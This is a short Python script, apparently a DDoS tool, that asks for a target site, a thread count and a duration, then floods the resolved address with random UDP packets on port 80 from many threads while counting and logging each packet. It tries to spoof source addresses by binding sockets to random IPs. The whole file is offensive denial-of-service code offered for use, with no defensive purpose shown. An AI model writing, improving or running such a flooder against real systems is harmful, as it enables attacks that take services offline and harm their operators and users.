import time
import socket
import sys
import _thread
import random
import string
import logging
import signal
import threading

site = input("Enter your site URL (e.g., example.com) => ")
thread_count = int(input("Enter the number of threads => "))
duration = int(input("Enter the attack duration (in seconds) => "))
try:
    ip = socket.gethostbyname(site)
except socket.gaierror:
    print("Error: Could not resolve the domain name. Please check the URL or your internet connection.")
    sys.exit(1)

UDP_PORT = 80
packet_count = 0
logging.basicConfig(filename='ddos.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def generate_random_message(size=1024):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

MESSAGE = generate_random_message()

def signal_handler(sig, frame):
    print("\nAttack stopped by user.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def get_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def get_random_port():
    return random.randint(1024, 65535)

def ddos(i):
    global packet_count
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind((get_random_ip(), get_random_port()))
            sock.sendto(bytes(MESSAGE, "UTF-8"), (ip, UDP_PORT))
            packet_count += 1
            print(f"Packet sent from thread {i}. Total packets: {packet_count}")
            logging.info(f"Packet sent from thread {i}")
            time.sleep(0.1)
        except Exception as e:
            print(f"Error in thread {i}: {e}")
            logging.error(f"Error in thread {i}: {e}")
    print(f"Thread {i} finished.")

print(f"Starting attack on {ip} with {thread_count} threads for {duration} seconds...")
time.sleep(3)

def monitor_attack():
    global packet_count
    start_time = time.time()
    while time.time() - start_time < duration:
        print(f"Elapsed time: {time.time() - start_time:.2f} seconds, Total packets sent: {packet_count}")
        time.sleep(1)

monitor_thread = threading.Thread(target=monitor_attack)
monitor_thread.start()

for i in range(thread_count):
    try:
        _thread.start_new_thread(ddos, (f"thread-{i}",))
    except KeyboardInterrupt:
        print("Attack stopped by user.")
        sys.exit(0)

start_time = time.time()
while True:
    if time.time() - start_time >= duration:
        print(f"Attack finished. Total packets sent: {packet_count}")
        break
    time.sleep(00.1)
